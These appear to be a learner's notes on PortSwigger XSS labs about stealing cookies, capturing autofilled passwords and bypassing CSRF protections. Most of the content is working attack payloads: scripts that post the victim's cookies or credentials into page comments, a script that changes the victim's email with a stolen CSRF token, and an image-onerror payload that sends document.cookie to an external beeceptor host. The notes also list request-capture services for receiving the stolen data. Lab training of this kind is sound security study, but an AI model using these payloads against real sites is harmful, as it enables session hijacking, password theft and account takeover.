
# Exploiting cross-site scripting to steal cookies
Stealing cookies is a traditional way to exploit XSS. 

Most web applications use cookies for session handling. 

You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.

In practice, this approach has some significant limitations:
- The victim might not be logged in.
- Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
- Sessions might be locked to additional factors like the user's IP address.
- The session might time out before you're able to hijack it.


### [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
Here are a few free services that you can use to expose data that comes from a JavaScript `fetch` request:

https://beeceptor.com/
https://designer.mocky.io/
https://webhook.site/#!/view/0c7daa23-c9d3-4020-8e57-67809fbfef29
https://requestbin.net/

https://jsonplaceholder.typicode.com/
https://mockapi.io/
https://reqres.in/

## My beeceptor
My API: https://app.beeceptor.com/console/booty#



```html
<script>
window.addEventListener('DOMContentLoaded', function(){
  // endpoint.
  const endpoint = "/post/comment"
  // find token from html body.
  const token = document.getElementsByName('csrf')[0].value;
  // create data form.
  const formData = new FormData();
  formData.append("csrf", token);
  formData.append("postId", "9");
  formData.append("comment", document.cookie);
  formData.append("name", "am");
  formData.append("email", "am5@am.com");
  formData.append("website", "https://google.com");
  // request.
  fetch(endpoint, { method: "POST", mode: "no-cors", body: formData }); 
});
</script>
```


---
# Exploiting cross-site scripting to capture passwords

These days, many users have password managers that auto-fill their passwords. 

You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. 

This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password.

The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill.


### [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)


```html
<input 
	type="text" 
	name="username"
	style="position: absolute; left: -9999px;"
>

<input 
	type="password"
	name="password" 
	onchange="hax()"
	style="position: absolute; left: -9999px;"
> 

<script>
function hax(){
	// data.
	const endpoint = "/post/comment"
	const username = document.getElementsByName('username')[0].value;
	const password = document.getElementsByName('password')[0].value;
	const token = document.getElementsByName('csrf')[0].value;
	// create data form.
	const formData = new FormData();
	formData.append("csrf", token);
	formData.append("postId", "2");
	formData.append("comment", `${username}:${password}`);
	formData.append("name", "victim");
	formData.append("email", "victim@victim.com");
	formData.append("website", "https://google.com");
	// request.
	fetch(endpoint, { method: "POST", mode: "no-cors", body: formData });
}
</script>
```



----
# Exploiting cross-site scripting to bypass CSRF protections

XSS enables an attacker to do almost anything a legitimate user can do on a website. By executing arbitrary JavaScript in a victim's browser, XSS allows you to perform a wide range of actions as if you were the victim user. 

For example, you might make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin.

Some websites allow logged-in users to change their email address without re-entering their password. 

If you've found an XSS vulnerability on one of these sites, you can exploit it to steal a CSRF token. 

With the token, you can change the victim's email address to one that you control. 
You can then trigger a password reset to gain access to the account.

This type of exploit combines XSS (to steal the CSRF token) with the functionality typically targeted by CSRF. 

While traditional CSRF is a "one-way" vulnerability, where the attacker can induce the victim to send requests but cannot see the responses, XSS enables "two-way" communication. 

This enables the attacker to both send arbitrary requests and read the responses, resulting in a hybrid attack that bypasses anti-CSRF defenses.


### [Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)


```html
<script>
window.addEventListener('DOMContentLoaded', function(){
  // endpoint.
  const endpoint = "/my-account/change-email"
  // find token from html body.
  const token = document.getElementsByName('csrf')[0].value;
  // create data form.
  const formData = new FormData();
  formData.append("csrf", token);
  formData.append("email", "new@new.com");
  // request.
  fetch(endpoint, { method: "POST", mode: "no-cors", body: formData }); 
});
</script>
```



```html
<img src=a onerror="fetch('booty.free.beeceptor.com/v',{method:'POST',body:document.cookie})">
```

```html
<img src= >
```